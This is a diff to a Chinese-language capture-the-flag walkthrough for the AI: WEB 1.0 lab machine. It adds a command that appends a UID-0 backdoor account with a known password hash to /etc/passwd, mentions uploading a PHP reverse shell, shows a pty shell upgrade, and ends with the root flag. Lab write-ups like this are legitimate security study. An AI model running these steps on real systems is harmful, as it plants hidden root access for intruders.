@@ -56,11 +56,37 @@ ls -l /etc/passwd
 相当于把密码替换掉x 创建新用户
 ![image](https://user-images.githubusercontent.com/1063747/180631040-4a30ac4c-f7b8-45a3-a082-817335e930d1.png)
 
-`echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:root:/root:/usr/bin/zsh' >> /etc/passwd`
+注意使用 /bin/bash
+`echo 'hack:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0::/root:/bin/bash' >> /etc/passwd`
 
 # weevely su
 这里会失败 weevely 的反弹shell  su 会报错
 `:shell_su -user hacker  123456 id`
+
+# 使用交互shell
+上传 tools/reverse_shell.php
+`python -c 'import pty;pty.spawn("/bin/bash")'`
+![image](https://user-images.githubusercontent.com/1063747/180632980-e7bd0f2e-cc3f-469f-9cad-5c1f91918332.png)
+
+```
+root@aiweb1:~# cat flag.txt
+cat flag.txt
+####################################################
+#                                                  #
+#                AI: WEB 1.0                       #
+#                                                  #
+#              Congratulation!!!                   #
+#                                                  #
+#      Thank you for penetrate my system.          #
+#                                                  #
+#            Hope you enjoyed this.                #
+#                                                  #
+#                                                  #
+#  flag{cbe5831d864cbc2a104e2c2b9dfb50e5acbdee71}  #
+#                                                  #
+####################################################
+
+```
 
 
 
